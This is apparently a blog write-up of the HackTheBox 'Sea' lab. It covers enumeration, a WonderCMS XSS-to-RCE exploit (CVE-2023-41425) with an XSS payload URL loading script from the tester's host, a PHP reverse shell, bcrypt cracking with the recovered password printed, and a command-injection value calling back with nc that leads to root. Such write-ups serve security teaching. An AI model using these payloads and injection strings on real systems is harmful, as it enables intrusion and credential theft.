+++
date = '2026-04-28T22:26:48-04:00'
draft = false
title = 'Sea'
author = 'Siddhant Singh'
+++

Sea is an easy-rated Linux box on HackTheBox. The attack chain goes from enumerating a WonderCMS install to exploiting an XSS-to-RCE vulnerability (CVE-2023-41425) that chains contact form injection with a malicious theme upload, cracking a bcrypt hash for lateral movement to a real user account, then abusing a local web dashboard that passes user input into an eval-style log analyser to escalate to root.

**Target:** `10.129.32.234`  
**My IP:** `10.10.14.217`

---

## Enumeration

### NMAP

Full-port scan with service detection in one pass.

```bash
sudo nmap -sC -sV -p- -Pn 10.129.32.234 --max-retries 1
```

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-29 00:47 -0400
Nmap scan report for 10.129.32.234
Host is up (0.031s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sea - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two ports — SSH and HTTP. Added `sea.htb` to `/etc/hosts` and moved to the web app.

---

### Port 80

The site is a basic informational page with a contact form. The form accepts a "website" field which is interesting. Nikto and dirb didn't surface much of value directly, but dirb found a `/data/` directory (403) and a `/messages/` directory — likely where `contact.php` writes submissions.

```bash
nikto -host http://sea.htb
```

```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.129.32.234
+ Target Hostname:    sea.htb
+ Target Port:        80
+ Start Time:         2026-04-29 00:59:21 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ /: Cookie PHPSESSID created without the httponly flag.
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: The X-Content-Type-Options header is not set.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54).
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /home/: This might be interesting.
+ 7962 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2026-04-29 01:04:07 (GMT-4) (286 seconds)
---------------------------------------------------------------------------
```

Nothing immediately exploitable there. Checking the page source revealed the CSS was being pulled from `http://sea.htb/themes/bike/css/style.css`. Browsing the theme directory exposed a `LICENSE` file:

```
http://sea.htb/themes/bike/html/LICENSE
```

```
MIT License

Copyright (c) 2019 turboblack
...
```

Searching for `turboblack` points to [https://github.com/turboblack/black](https://github.com/turboblack/black) — a WonderCMS theme. That confirmed the CMS. The default admin URL (`/loginURL`) was reachable but default and guessed passwords didn't work.

---

## Foothold — WonderCMS XSS-to-RCE (CVE-2023-41425)

`searchsploit wonder` listed several WonderCMS exploits, and ExploitDB 52271 matched the version range — it chains a stored XSS in the contact form's website field with a malicious theme install that drops a PHP webshell.

```
searchsploit wonder
```

```
WonderCMS 3.4.2 - Remote Code Execution (RCE)  |  php/remote/52271.py
Wondercms 4.3.2 - XSS to RCE
```

I modified the exploit to embed a full [Ivan Sincek PHP shell](https://github.com/ivan-sinclair/php-reverse-shell) instead of the generic `system()` one-liner, then ran it:

```bash
python 52271.py --url http://sea.htb/loginURL --xip 10.10.14.217 --xport 80
```

```
[+] Creating PHP Web Shell
[+] Writing malicious.js
[+] XSS Payload:
http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.217:80/malicious.js"></script><form+action="
[+] Web Shell can be accessed once .zip file has been requested:
http://sea.htb/themes/malicious/malicious.php?cmd=<COMMAND>
[+] Starting HTTP server
Serving HTTP on 10.10.14.217 port 80 ...
10.129.32.234 - - [29/Apr/2026 01:59:10] "GET /malicious.js HTTP/1.1" 200 -
10.129.32.234 - - [29/Apr/2026 01:59:20] "GET /malicious.zip HTTP/1.1" 200 -
10.129.32.234 - - [29/Apr/2026 01:59:21] "GET /malicious.zip HTTP/1.1" 200 -
```

Submitted the XSS payload URL in the contact form's website field. The server (presumably an admin bot) fetched my JS, which triggered the theme install and pulled down the malicious zip. Then triggered the shell via a curl call to the installed webshell and caught it on my listener:

```bash
nc -lvnp 9000
```

```
connect to [10.10.14.217] from (UNKNOWN) [10.129.32.234] 46388
SOCKET: Shell has connected! PID: 6511
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@sea:/var/www/sea/themes/malicious$
```

Shell as `www-data`.

---

## Lateral Movement — www-data → amay

Poked around the web root and found the WonderCMS database file in `/var/www/sea/data/database.js` containing a bcrypt password hash:

```bash
cat /var/www/sea/data/database.js
```

```json
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "login": "loginURL",
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
        ...
    }
}
```

```
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q
```

John couldn't handle it cleanly so went straight to hashcat. Mode `3200` (bcrypt $2\*, Blowfish Unix) cracked it against rockyou:

```bash
hashcat -a 0 hash /usr/share/wordlists/rockyou.txt
```

**Credentials:** `amay` / **`mychemicalromance`**

Upgraded to a proper SSH session by writing my public key into `/home/amay/.ssh/authorized_keys` from the www-data shell.

---

## Privilege Escalation — amay → root

### Internal Service on Port 8080

linpeas flagged two localhost-only ports — `8080` and `56835`:

```
══╣ Active Ports (netstat)
tcp  0  0  127.0.0.1:56835  0.0.0.0:*  LISTEN
tcp  0  0  0.0.0.0:80       0.0.0.0:*  LISTEN
tcp  0  0  127.0.0.1:8080   0.0.0.0:*  LISTEN
tcp  0  0  0.0.0.0:22       0.0.0.0:*  LISTEN
```

Forwarded both ports over SSH, then fingerprinted locally:

```bash
nmap -sC -sV -p56835,8080 127.0.0.1
```

```
PORT      STATE SERVICE VERSION
8080/tcp  open  http    PHP cli server 5.5 or later (PHP 7.4.3-4ubuntu2.23)
| http-auth:
|   HTTP/1.0 401 Unauthorized
|_  Basic realm=Restricted Area
56835/tcp open  unknown
```

Port 8080 is a HTTP basic-auth protected site. Logged in with `amay`:`mychemicalromance` — same creds worked. The UI has a log file analyser with a dropdown. The interesting part is the POST request it sends:

```
log_file=/var/log/apache2/access.log&analyze_log=
```

The `log_file` parameter accepts arbitrary paths — confirmed by reading `/etc/passwd` and `/etc/shadow` directly. Better still, appending a semicolon-separated command after the path gets executed — the value is passed into something eval-like server-side:

```
log_file=%2Fetc%2Fshadow;nc 10.10.14.217 9001&analyze_log=id
```

Got a callback on port 9001. Couldn't get a direct reverse shell through this, but could execute arbitrary commands as root. From the SSH session as `amay`, wrote a small script to append my public key to `/root/.ssh/authorized_keys`, then triggered it via the log analyser endpoint. Then SSH'd straight in as root:

```bash
ssh root@sea.htb -i amay
```

```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)
Last login: Wed Aug 14 15:25:51 2024
root@sea:~#
```

### Root

```bash
root@sea:~# id
uid=0(root) gid=0(root) groups=0(root)
```
